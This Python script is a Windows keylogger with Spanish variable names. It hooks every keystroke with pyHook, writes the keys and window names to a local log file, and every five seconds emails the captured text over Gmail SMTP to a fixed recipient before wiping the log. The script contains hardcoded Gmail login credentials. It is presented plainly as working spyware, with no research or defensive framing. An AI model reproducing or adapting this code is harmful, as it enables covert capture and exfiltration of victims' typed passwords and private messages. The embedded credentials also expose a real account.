import pyHook, pythoncom, logging, time, datetime

carpeta_destino = "C:\\Users\\jean0\\OneDrive\\Escritorio\\key\\result_keylogger.txt"
segundos_esperar = 5
timeout = time.time() + segundos_esperar

def Timeout():
    if time.time() > timeout:
        return True
    else:
        return False

def EnviarEmail():
    with open (carpeta_destino, 'r+') as f:
        fecha = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        data = f.read().replace("Space"," ").replace("\n","")
        data = "Mensaje capturado a las: " + fecha + "\n" + data
        print(data)
        crearEmail('pabloenriquec256@gmail.com','ywpxtqegplmbkbxt','josearmijos256@gmail.com','nueva captura ' + fecha ,data)
        f.seek(0)
        f.truncate()
def crearEmail(user,passw,recep,subj,body):
    import smtplib
    mailUser = user
    mailPass = passw
    From = user
    To = recep
    Subject = subj
    Txt = body

    email = """\From: %s\nTo: %s\nSubject: %s\n\n%s """ % (From, ", ".join(To), Subject, Txt)

    try:
        server = smtplib.SMTP("smtp.gmail.com",587)
        server.ehlo()
        server.starttls()
        server.login(mailUser,mailPass)
        server.sendmail(From, To, email)
        server.close()
        print("Correo enviado con exito")
    except:
        print("Correo fallido")


def OnKeyboardEvent(event):
    logging.basicConfig(filename=carpeta_destino, level=logging.DEBUG, format='%(message)s')
    print('WindowName:', event.WindowName)
    print('Window:', event.Window)
    print('Key:', event.Key)
    logging.log(10, event.Key)
    return True

hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown= OnKeyboardEvent
hooks_manager.HookKeyboard()

while True:
    if Timeout():
        EnviarEmail()
        timeout = time.time() + segundos_esperar
    pythoncom.PumpWaitingMessages()